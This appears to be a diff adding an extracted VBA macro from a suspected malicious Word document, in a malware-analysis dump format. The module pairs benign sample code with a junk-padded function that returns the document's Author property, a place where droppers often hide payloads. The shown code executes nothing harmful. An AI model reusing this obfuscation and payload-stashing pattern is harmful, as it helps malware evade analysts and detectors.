@@ -1,0 +1,32 @@
+Filename     : ./macros/45f8c1de7d25c8a24246943ae194cb692add12efaab12d2689aa7a47e7d6b46a
+OLE stream   : Macros/VBA/balinese
+VBA filename : balinese.bas
+----------------------------------------
+Attribute VB_Name = "balinese"
+Sub FieldsCollectionObject()
+   Dim MyText As String
+   Dim MyRange As Object
+   Set MyRange = Selection.Range
+   MyText = "<Replace this with your text>"
+   ' Selection Example:
+   Selection.Fields.Add Range:=Selection.Range, _
+      Type:=wdFieldQuote, Text:=MyText
+   ' Range Example:
+    Range.Fields.Add Range:=Selection.Range, _
+      Type:=wdFieldQuote, Text:=MyText
+End Sub
+
+Public Function urging() As String
+Dim danceable As Integer
+Dim duplicature As Variant
+abranchiate = 104 - 25
+constrainedly = 104 + 87 - 98
+If abranchiate + constrainedly < 99 Then
+eellike = StrReverse("ni") + Ucase("DefiC") + "ient"
+End If
+
+Dim multure As String
+urging = ActiveDocument.BuiltInDocumentProperties("Author")
+End Function
+
+
